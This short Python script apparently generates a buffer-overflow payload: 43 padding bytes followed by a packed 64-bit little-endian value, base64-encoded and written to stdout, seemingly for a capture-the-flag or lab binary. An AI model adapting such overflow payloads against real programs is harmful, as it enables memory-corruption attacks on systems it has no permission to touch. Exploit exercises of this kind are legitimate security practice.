
import sys
import struct
import base64

buf = b'ttttttttttttttttttttttttttttttttttttttttttt'
buf += struct.pack('<Q', 13693252217968114749)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
